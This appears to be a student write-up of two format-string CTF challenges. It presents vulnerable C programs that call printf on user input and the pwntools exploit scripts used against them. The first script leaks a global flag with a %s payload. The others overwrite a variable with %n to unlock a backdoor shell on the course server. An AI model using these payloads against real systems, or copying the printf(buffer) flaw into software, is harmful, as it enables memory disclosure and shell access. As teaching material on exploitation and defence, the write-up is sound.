# CTF 5 - Format Strings

## Challenge 1

## 1. Reconnaissance

Initially, a ZIP file containing files identical to those being executed on port 4004 of the FSI CTF server was provided.

The first step was to run the ```checksec``` command on *program*.

```bash
checksec --file=./program
```
![checksec](images/format-strings-ctf/checksec.png)

With this, we concluded that:
- the file's architecture is x86 (Arch)
- there is a canary protecting the return address (Stack)
- the stack has execution permission (NX)
- the binary positions are not randomized (PIE)
- there are memory positions with read, write and execution permissions stack (RWX)

We then proceeded to analyze the code of *main.c* and look for a vulnerability to explore.

```c
#include <stdio.h>
#include <stdlib.h>

#define FLAG_BUFFER_SIZE 40

char flag[FLAG_BUFFER_SIZE];

void load_flag(){
    FILE *fd = fopen("flag.txt","r");

    if(fd != NULL) {
        fgets(flag, FLAG_BUFFER_SIZE, fd);
    }
}

int main() {

    load_flag();
   
    char buffer[32];

    printf("Try to unlock the flag.\n");
    printf("Show me what you got:");
    fflush(stdout);
    scanf("%32s", &buffer);
    printf("You gave me this: ");
    printf(buffer);

    if(0) {
        printf("I like what you got!\n%s\n", flag);
    } else {
        printf("\nDisqualified!\n");
    }
    fflush(stdout);
    
    
    return 0;
}
```

## 2. Searching for/Choosing a Vulnerability

The first thing that stood out was the following segment of code:

```c
scanf("%32s", &buffer);
printf("You gave me this: ");
printf(buffer);
```

We decided to explore this due to the absence of PIE - meaning that the address of ```load_flag``` should remain constant after execution. Additionally, there is a ```scanf``` function that can be leveraged to input our desired string, which will be printed immediately afterward.

The next task was to find the address of ```flag```. To do this, we used GDB, as shown below. 

![gdb-task1](images/format-strings-ctf/gdb-task1.png)

## 3. Finding an Exploit

The code used had as a template the one developed to solve the SEED Lab; the major difference was that, in this CTF, the input was printed out immediately.

```python
from pwn import *
import sys


LOCAL = False

if LOCAL:
    p = process("./program")
    """
    O pause() para este script e permite-te usar o gdb para dar attach ao processo
    Para dar attach ao processo tens de obter o pid do processo a partir do output deste programa. 
    (Exemplo: Starting local process './program': pid 9717 - O pid seria  9717) 
    Depois correr o gdb de forma a dar attach. 
    (Exemplo: `$ gdb attach 9717` )
    Ao dar attach ao processo com o gdb, o programa para na instrução onde estava a correr.
    Para continuar a execução do programa deves no gdb  enviar o comando "continue" e dar enter no script da exploit.
    """
    pause()
else:    
    p = remote("ctf-fsi.fe.up.pt", 4004)

content = bytearray(0x0 for i in range(32))

number  = 0x804c060
content[0:4]  =  (number).to_bytes(4,byteorder='little')

s = "%s"
fmt  = (s).encode('latin-1')
content[4:4+len(fmt)] = fmt

p.recvuntil(b"got:")
p.sendline(content)
p.interactive()
```

## 4. Exploring the Vulnerability

With the exploit developed, we just needed to test it. This led us to the capture of the flag.

![flag-task1](images/format-strings-ctf/flag-task1.png)


## Challenge 2

## 1. Reconnaissance

In this second challenge, we were also given a ZIP with some files (that are simultaneously available in port 4005 of the server). 
After running ```checksec```, we verified that the restrictions were the same as the ones from the previous challenge.

## 2. Searching for/Choosing a Vulnerability

After inspecting the *main.c* file, we came to the conclusion that, to get the flag, we first needed to change a global variable to ```0xbeef```, instead of reading from it.  

```c
#include <stdio.h>
#include <stdlib.h>

char pad[2] = "\x00\x00";
int key = 0;

int main() {
   
    char buffer[32];

    printf("There is nothing to see here...");
    fflush(stdout);
    scanf("%32s", &buffer);
    printf("You gave me this:");
    printf(buffer);
    fflush(stdout);

    if(key == 0xbeef) {
        printf("Backdoor activated\n");
        fflush(stdout);
        system("/bin/bash");    
    } else {
    	printf("\n\n\nWrong key: %d\n", key);
	fflush(stdout);
    }
        
    return 0;
}
```
As in the first challenge, we were able find the address of ```key``` utilizing GDB.

![gdb-task2](images/format-strings-ctf/gdb-task2.png)

## 3. Finding an Exploit

It was necessary to write 48879 bytes; doing it directly was not, however, possible. Since we had already written 4 bytes, corresponding to the address of ```key```, only 48875 bytes were required. 
Another change was to use ```%n``` instead of ```%s``` - overwrites the value of ```key``` instead of reading it.

To do this, we came up with following script:

```python
from pwn import *
import sys


LOCAL = False

if LOCAL:
    p = process("./program")
    """
    O pause() para este script e permite-te usar o gdb para dar attach ao processo
    Para dar attach ao processo tens de obter o pid do processo a partir do output deste programa. 
    (Exemplo: Starting local process './program': pid 9717 - O pid seria  9717) 
    Depois correr o gdb de forma a dar attach. 
    (Exemplo: `$ gdb attach 9717` )
    Ao dar attach ao processo com o gdb, o programa para na instrução onde estava a correr.
    Para continuar a execução do programa deves no gdb  enviar o comando "continue" e dar enter no script da exploit.
    """
    pause()
else:    
    p = remote("ctf-fsi.fe.up.pt", 4005)

content = bytearray(0x0 for i in range(32))

number  = 0x804b324
content[0:4]  =  (number).to_bytes(4,byteorder='little')

s = "%.48875x" + "%n"
fmt  = (s).encode('latin-1')
content[4:4+len(fmt)] = fmt

p.recvuntil(b"...")
p.sendline(content)
p.interactive()
```

## 4. Exploring the Vulnerability

The previous script was not successful because ```%x```, and not ```%n``` as expected, was affecting the address that we wanted to write to.

To avoid this behavior, we utilized a fake address; by doing this, ```%x``` afects the address and ```%n``` the ```key``` variable, as desired.

```python
from pwn import *
import sys


LOCAL = False

if LOCAL:
    p = process("./program")
    """
    O pause() para este script e permite-te usar o gdb para dar attach ao processo
    Para dar attach ao processo tens de obter o pid do processo a partir do output deste programa. 
    (Exemplo: Starting local process './program': pid 9717 - O pid seria  9717) 
    Depois correr o gdb de forma a dar attach. 
    (Exemplo: `$ gdb attach 9717` )
    Ao dar attach ao processo com o gdb, o programa para na instrução onde estava a correr.
    Para continuar a execução do programa deves no gdb  enviar o comando "continue" e dar enter no script da exploit.
    """
    pause()
else:    
    p = remote("ctf-fsi.fe.up.pt", 4005)

content = bytearray(0x0 for i in range(32))

number  = 0x1231231
content[0:4]  =  (number).to_bytes(4,byteorder='little')
number  = 0x804b324
content[4:8]  =  (number).to_bytes(4,byteorder='little')

s = "%.48871x" + "%n"
fmt  = (s).encode('latin-1')
content[8:8+len(fmt)] = fmt

p.recvuntil(b"...")
p.sendline(content)
p.interactive()
```

Then, we were able to get the flag.

```bash
cat flag.txt
```

![flag-task2](images/format-strings-ctf/flag-task2.png)
